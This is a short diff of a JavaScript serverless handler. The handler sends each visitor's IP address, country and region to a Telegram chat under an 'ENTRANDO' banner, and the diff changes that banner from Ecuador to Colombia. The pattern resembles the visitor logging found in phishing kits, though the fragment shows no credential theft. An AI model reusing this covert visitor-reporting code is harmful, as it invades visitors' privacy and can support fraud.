@@ -36,7 +36,7 @@ export default async function handler(req, res) {
   if (!token || !chat) return res.status(500).send('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
 
   const lines = [
-    'ENTRANDO ECUADOR 🏆',
+    'ENTRANDO COLOMBIA 🏆',
     `📍IP: ${ip}`,
     geo.country && `🌎País: ${geo.country}`,
     geo.region  && `🌎Región: ${geo.region}`,
